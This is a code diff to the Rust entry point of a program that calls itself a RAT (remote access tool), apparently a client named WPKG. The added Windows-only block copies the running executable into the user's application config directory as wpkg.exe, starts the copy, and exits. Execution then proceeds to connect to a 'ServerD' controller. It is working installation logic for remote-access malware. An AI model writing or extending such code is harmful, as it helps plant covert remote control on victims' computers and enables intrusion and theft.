@@ -41,6 +41,42 @@ async fn main() {
     #[cfg(not(target_os = "windows"))]
     warn!("RAT isn't runned on Windows. Some features may be unavailable. Use for debug only");
 
+    #[cfg(target_os = "windows")]
+    {
+        use crate::utils::Utils;
+        use platform_dirs::AppDirs;
+        use std::env;
+        use std::fs;
+        use std::process;
+
+        let install = || -> anyhow::Result<()> {
+            let exe_path = env::current_exe()?.display().to_string();
+
+            let app_dirs = AppDirs::new(Some("WPKG"), true).unwrap();
+            let config_dir = app_dirs.config_dir.display().to_string();
+
+            let exe_target = format!("{}\\{}", config_dir, "wpkg.exe");
+
+            if exe_path != exe_target {
+                info!("WPKG not installed. Installing in {}...", config_dir);
+
+                fs::create_dir(config_dir)?;
+
+                fs::copy(exe_path, exe_target.clone())?;
+
+                info!("Running WPKG...");
+                Utils::run_process(&exe_target, "", false);
+
+                process::exit(0);
+            }
+            Ok(())
+        };
+
+        if let Err(err) = install() {
+            error!("Failed to install WPKG: {}", err);
+        }
+    }
+
     // connect to the ServerD
     client::connect();
 }
